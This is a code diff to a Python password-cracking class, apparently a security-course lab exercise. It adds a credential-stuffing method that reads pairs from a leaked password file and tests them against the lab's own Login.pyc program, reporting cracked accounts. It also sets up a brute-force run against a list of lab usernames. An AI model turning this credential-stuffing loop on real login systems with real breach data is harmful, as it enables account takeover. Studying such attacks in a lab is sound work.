@@ -69,6 +69,31 @@ class SkeletonKey:
         
         except KeyboardInterrupt:
             print("Quit successfully\n")
+
+    def crack_pass_leaked_database(self):
+        ''''''
+        number_runs = 0
+        cracked_map = {}
+        user_set = set(self.users)
+
+        with open(self.passwd_file_path, "r") as file:
+            for row in file:
+                number_runs += 1
+                split_string = row.split(",")
+                user, passwd = split_string[0].strip(), split_string[1].strip()
+
+                if user in user_set:
+                    run = subprocess.run(["python3", self.exe_path, user, passwd], capture_output=True, text=True)
+                    if run.stdout == "Login successful.\n":
+                        print(f"============================================\nCracked!\nUsername:{user}\nPassword:{passwd}\n============================================\n")
+                        cracked_map[user] = passwd
+                        return cracked_map
+                
+                if number_runs % self.print_interval == 0: 
+                    print(f"###################################################\nProgressUpdate\nRun #{number_runs}\nTesting {user}->{passwd}\n###################################################\n")
+
+
+
         
 if __name__ == '__main__':
     ###########################################
@@ -113,7 +138,7 @@ if __name__ == '__main__':
     key = SkeletonKey(passwd_file_path = test_param[0],
                       user_file_path = test_param[1],
                       exe_path = test_param[2],
-                      cracked_users=set(["SkyRedFalcon914", "MontainBlueFalcon157"]))
+                      cracked_users=set(["SkyRedFalcon914", "MountainPurpleShark585"]))
     
     key.crack_pass_bruteforce(max_cracked=1, print_interval=100)
 
@@ -122,6 +147,18 @@ if __name__ == '__main__':
     ###########################################
     ##########          Q4          ###########
     ###########################################
+    test_param = [
+        "/home/cse/Lab1/Q4/PwnedPWfile", # passwd path
+        "/home/cse/Lab1/Q4/gang", # user path
+        "/home/cse/Lab1/Q4/Login.pyc" # exe path
+    ]
+    key = SkeletonKey(passwd_file_path = test_param[0],
+                      user_file_path = test_param[1],
+                      exe_path = test_param[2],
+                      cracked_users=set(["SkyRedFalcon914", "MountainPurpleShark585"]),
+                      print_interval=100
+    )
+    key.crack_pass_leaked_database()
 
 
 
